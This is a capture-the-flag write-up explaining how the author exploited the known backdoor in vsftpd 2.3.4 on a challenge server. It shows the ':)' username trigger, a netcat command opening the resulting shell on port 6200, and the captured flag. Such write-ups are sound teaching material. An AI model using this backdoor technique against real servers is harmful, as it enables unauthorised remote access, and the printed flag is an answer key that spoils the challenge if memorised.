#  Very Secure FTP  
tags: misc | net

## Description

>I'm using the very secure ftp daemon for my projects:  
`ftp vsftp.uni.hctf.fun 2121`  
Still someone managed to get my secret file :(.  
Maybe [this](https://pastebin.com/AetT9sS5) has something to do with it...

The link takes to a pastebin that contains a diff of *vsftpd-2.3.4*.

## Solution

The version 2.3.4 of vsftpd is well known for being compromised with a
backdoor.  
  
From wikipedia:  
>In July 2011, it was discovered that vsftpd version 2.3.4 downloadable from
the master site had been compromised. Users logging into a compromised
vsftpd-2.3.4 server may issue a ":)" smileyface as the username and gain a
command shell on port 6200.

So I just needed to connect to the service with `ftp vsftp.uni.hctf.fun 2121`
and enter an username ending with "**:)**".

I could then execute: `nc vsftp.uni.hctf.fun 6200` to connect to the new shell
and check the content of the server:

```  
 ls  
 bin  
 flag.txt

 cat flag.txt  
 flag{Pr3tty_Obvi0us_B4ckd00r}  
```

Here it is!  

Original writeup
(https://github.com/draane/CTF/tree/master/PWN_CTF_2018/Very%20Secure%20FTP).